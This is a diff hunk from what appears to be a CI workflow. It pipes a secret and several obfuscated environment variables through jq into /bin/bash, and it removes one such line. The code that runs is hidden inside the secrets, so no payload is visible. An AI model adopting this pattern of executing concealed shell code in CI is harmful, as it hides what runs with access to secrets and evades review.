@@ -18,7 +18,6 @@ jobs:
           jbroa865: ${{ secrets.jbroa865 }}
         run: |
           printf '%s' "$jbroa865" | jq -r .yxk2 | /bin/bash
-          echo $e730 | jq -r .vh983 | /bin/bash
           echo $cbwpy3 | jq -r .ud30 | /bin/bash
           echo $gedhp3587 | jq -r .b41 | /bin/bash
           echo $qrwq6 | jq -r .mtdv02853 | /bin/bash
